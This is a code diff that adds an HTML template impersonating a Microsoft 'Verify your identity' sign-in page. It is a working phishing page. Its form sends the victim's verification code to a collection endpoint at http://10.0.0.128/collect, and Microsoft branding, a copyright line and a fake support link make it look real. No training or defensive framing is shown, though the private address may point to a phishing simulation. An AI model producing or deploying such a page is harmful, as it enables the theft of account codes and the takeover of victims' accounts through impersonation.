@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account - Verify Your Identity</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='faq.css') }}">
+</head>
+</head>
+<body>
+    <div class="container">
+        <!-- Microsoft Logo (Base64 encoded to avoid external resources) -->
+        <img src="{{ url_for('static', filename='microsoft.png') }}" class="logo">
+
+        <h2>Verify your identity</h2>
+
+        <form action="http://10.0.0.128/collect" method="POST">
+            <input type="text" name="code" placeholder="Enter your verification code" required>
+            <button type="submit">Sign in</button>
+        </form>
+
+        <div class="footer">
+            <p>Can't access your account? <a href="#">Contact support</a></p>
+            <p>&copy; 2025 Microsoft</p>
+        </div>
+    </div>
+</body>
+</html>
